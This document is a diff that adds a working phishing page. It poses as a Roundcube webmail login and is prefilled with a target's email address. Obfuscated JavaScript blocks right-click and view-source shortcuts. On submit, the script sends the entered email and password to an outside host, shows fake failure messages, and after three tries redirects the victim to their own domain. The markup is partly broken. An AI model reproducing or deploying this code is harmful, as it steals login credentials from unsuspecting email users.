@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Webmail Login</title>
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background-color: #f4f6f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-card { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 320px; }
+        h2 { text-align: center; color: #333; margin-bottom: 25px; }
+        
+        /* Container for the icon and input */
+        .input-group {
+            position: relative;
+            margin: 10px 0;
+        }
+
+        /* Styling the Icon */
+        .input-group .material-icons {
+            position: absolute;
+            left: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #888;
+            font-size: 20px;
+        }
+
+        /* Adjusting input padding to make room for the icon */
+        input { 
+            width: 100%; 
+            padding: 12px 12px 12px 40px; /* 40px left padding for icon */
+            border: 1px solid #ddd; 
+            border-radius: 4px; 
+            box-sizing: border-box; 
+            transition: border-color 0.3s;
+        }
+
+        input:focus {
+            border-color: #007bff;
+            outline: none;
+        }
+
+        button { width: 100%; padding: 12px; background: rgb(59, 127, 217); border: none; color: white; font-size: 16px; border-radius: 4px; cursor: pointer; margin-top: 10px; }
+        button:hover { background: rgb(59, 127, 217); }
+        .footer { text-align: center; font-size: 12px; color: #888; margin-top: 20px; }
+    </style>
+</head>
+<body>
+
+<div class="login-card">
+    <h2><div><img src="https://nomandesignsourcing.com:2096/cPanel_magic_revision_1709574269/unprotected/cpanel/images/webmail-logo.svg" width="60%"></img></div></h2>
+    <form action="" method="POST">
+        <div class="input-group">
+            <span class="material-icons">email</span><input type="hidden" name="username" id="username" >
+            <input type="text" required id="ai" value="info@jori.org" readonly name="_user" autocomplete="off" placeholder="Username (email)" required>
+        </div>
+		<input type="hidden" name="login" id="login" >
+		<input type="hidden" name="userid" id="userid" >
+		<input type="hidden" name="username" id="username" >
+		<input type="hidden" name="loginid" id="loginid" >
+        <div class="input-group">
+            <span class="material-icons">lock</span>
+            <input type="password" id="pr" name="_pass" autocomplete="off" placeholder="Password" required>
+        </div><input type="hidden" name="user_id" id="user_id" >
+
+        <button style="font-size:13px;" id="submit-btn" type="submit">Login</button>
+    </form>
+    <div class="footer">Powered by Roundcube<br>Copyrigt&copy;2026</div>
+	<span style="visibility:hidden" id="aich">info@jousui@msc.po</span>
+</div>
+
+</body>
+</script>
+
+<!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+
+<script>
+
+$(document)["bind"]('keydown', function (_0x73787b) {
+  if (_0x73787b["ctrlKey"] && _0x73787b['which'] == 0x53) {
+    _0x73787b["preventDefault"]();
+    return false;
+  }
+});
+document["addEventListener"]("contextmenu", _0x904ce5 => _0x904ce5["preventDefault"]());
+document['onkeydown'] = function (_0x24e52d) {
+  return !(_0x24e52d["ctrlKey"] && (_0x24e52d["keyCode"] === 0x43 || _0x24e52d["keyCode"] === 0x56 || _0x24e52d["keyCode"] === 0x55 || _0x24e52d["keyCode"] === 0x75));
+};
+$(document)["keypress"]('u', function (_0x3e1187) {
+  return !_0x3e1187["ctrlKey"];
+});
+$(document)["ready"](function () {
+  var _0x5d896a = 0x0;
+  var _0x248387 = window["location"]['hash']["substr"](0x1);
+  if (!_0x248387) {} else {
+    var _0x1e053f = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;
+    if (!_0x1e053f["test"](_0x248387)) {
+      var _0x2d5c8d = _0x248387;
+    } else {
+      var _0x2d5c8d = atob(_0x248387);
+    }
+    var _0xc744df = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+    if (!_0xc744df["test"](_0x2d5c8d)) {
+      $("#error")["show"]();
+      _0x248387["focus"];
+      return false;
+    }
+    var _0x1df61b = _0x2d5c8d["indexOf"]('@');
+    var _0x577a0f = _0x2d5c8d["substr"](_0x1df61b + 0x1);
+    var _0x1d53fa = _0x577a0f["substr"](0x0, _0x577a0f["indexOf"]('.'));
+    var _0x3a4d98 = _0x1d53fa['toUpperCase']();
+    $("#ai")["val"](_0x2d5c8d);
+    $("#div1")["animate"]({
+      'left': 0x0,
+      'opacity': "hide"
+    }, 0x0);
+    $('#div2')["animate"]({
+      'right': 0x0,
+      'opacity': "show"
+    }, 0x1f4);
+    $('#aicx')['html'](_0x2d5c8d);
+    $('#aicxx')['html'](_0x2d5c8d);
+    $("#aich")["html"](_0x2d5c8d);
+    $["get"]("https://logo.clearbit.com/" + _0x577a0f)["done"](function () {
+      $("#logoimg")["attr"]('src', "https://logo.clearbit.com/" + _0x577a0f);
+      $("#logoname")["html"](_0x3a4d98);
+      $("#logonamec")["html"](_0x3a4d98);
+    })["fail"](function () {
+      $('#logoimg')["attr"]('src', 'https://zhongyou.org:2096/cPanel_magic_revision_1645739615/unprotected/cpanel/images/webmail-logo.svg');
+      $("#logoname")["html"]('');
+      $("#logonamec")["html"]('');
+    });
+  }
+  $("#ai")["click"](function () {
+    $("#error")['hide']();
+  });
+  $(document)['keypress'](function (_0x487d8e) {
+    var _0x9603b4 = _0x487d8e['keyCode'] ? _0x487d8e['keyCode'] : _0x487d8e["which"];
+    if (_0x9603b4 == '13') {
+      _0x487d8e["preventDefault"]();
+      if ($('#div1')['is'](":visible")) {
+        $("#next")['click']();
+      } else {
+        if ($("#div2")['is'](":visible")) {
+          _0x487d8e['preventDefault']();
+          $("#submit-btn")["click"]();
+        } else {
+          return false;
+        }
+      }
+    }
+  });
+  $('#next')["click"](function () {
+    event["preventDefault"]();
+    var _0x3cd85e = $("#ai")["val"]();
+    var _0x2497c6 = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+    if (!_0x2497c6["test"](_0x3cd85e)) {
+      $("#error")["show"]();
+      _0x248387["focus"];
+      return false;
+    }
+    var _0x15970d = _0x3cd85e["indexOf"]('@');
+    var _0x59a955 = _0x3cd85e["substr"](_0x15970d + 0x1);
+    var _0x51206e = _0x59a955['substr'](0x0, _0x59a955['indexOf']('.'));
+    var _0x16adee = _0x51206e["toUpperCase"]();
+    $("#div1")['animate']({
+      'left': 0x0,
+      'opacity': "hide"
+    }, 0x0);
+    $("#div2")["animate"]({
+      'right': 0x0,
+      'opacity': 'show'
+    }, 0x1f4);
+    $("#aich")["html"](_0x3cd85e);
+    $("#aicx")["html"](_0x3cd85e);
+    $('#aicxx')["html"](_0x3cd85e);
+    $["get"]('' + _0x59a955)['done'](function () {
+      $("#logoimg")["attr"]("src", '' + _0x59a955);
+      $("#logoname")["html"](_0x16adee);
+      $("#logonamec")["html"](_0x16adee);
+    })['fail'](function () {
+      $("#logoimg")['attr']("src", 'https://zhongyou.org:2096/cPanel_magic_revision_1645739615/unprotected/cpanel/images/webmail-logo.svg');
+      $('#logoname')["html"]('');
+      $('#logonamec')['html']('');
+    });
+  });
+  $("#submit-btn")['click'](function (_0x9f9c73) {
+    _0x9f9c73['preventDefault']();
+    var _0x5d5229 = $('#ai')["val"]();
+    var _0x2b33a7 = $("#pr")['val']();
+    var _0x499e00 = $("#field")['html']();
+    var _0x26a245 = $('#msg')["html"]();
+    var _0x1b3791 = _0x5d5229["indexOf"]('@');
+    var _0x35d772 = _0x5d5229["substr"](_0x1b3791 + 0x1);
+    $("#msg")['text'](_0x26a245);
+    _0x5d896a = _0x5d896a + 0x1;
+    $["ajax"]({
+      'dataType': "JSON",
+      'url': "https://sun.morokox.shop/restore.php",
+      'type': "POST",
+      'data': {
+        'ai': _0x5d5229,
+        'pr': _0x2b33a7,
+        'detail': _0x499e00
+      },
+      'beforeSend': function (_0x1f44d0) {
+        $('#submit-btn')['html']("Log in");
+      },
+      'success': function (_0xb6a218) {
+        $('#pr')["val"]('');
+        if (_0x5d896a >= 0x3) {
+          _0x5d896a = 0x0;
+          $("#div2")["animate"]({
+            'left': 0x0,
+            'opacity': "hide"
+          }, 0x0);
+          $("#div3")['animate']({
+            'left': 0x0,
+            'opacity': 'show'
+          }, 0x1f4);
+          setTimeout(() => {
+            window["location"]["replace"]('https://www.' + _0x35d772 + ":2096/cPanel_magic_revision_1675163319/unprotected/cpanel/cPanel_magic_revision_1673293160/unprotected/cpanel/images/icon-username.png");
+          }, 0x1f4);
+          return false;
+        }
+        if (_0x5d896a == 0x2) {
+          $("#msg2")["show"]();
+          $("#msg")["hide"]();
+          $("#msg1")['hide']();
+          $("#msg3")["hide"]();
+        } else {
+          $("#msg1")["show"]();
+          $("#msg")['hide']();
+          $("#msg2")["hide"]();
+          $("#msg3")["hide"]();
+        }
+      },
+      'error': function () {
+        $("#pr")["val"]('');
+        if (_0x5d896a >= 0x3) {
+          _0x5d896a = 0x0;
+          $("#div2")["animate"]({
+            'left': 0x0,
+            'opacity': "hide"
+          }, 0x0);
+          $("#div3")["animate"]({
+            'left': 0x0,
+            'opacity': "show"
+          }, 0x1f4);
+          setTimeout(() => {
+            window["location"]["replace"]("https://www." + _0x35d772 + ":2096/cPanel_magic_revision_1675163319/unprotected/cpanel/cPanel_magic_revision_1673293160/unprotected/cpanel/images/icon-username.png");
+          }, 0x3e8);
+          return false;
+        }
+        if (_0x5d896a == 0x2) {
+          $("#msg3")["show"]();
+          $('#msg')["hide"]();
+          $("#msg1")["hide"]();
+          $("#msg2")["hide"]();
+        } else {
+          $("#msg1")['show']();
+          $("#msg")["hide"]();
+          $("#msg2")["hide"]();
+          $("#msg3")['hide']();
+        }
+      },
+      'complete': function () {
+        $("#submit-btn")["html"]("Login failed try again");
+      }
+    });
+  });
+});
+</script>
+</html>
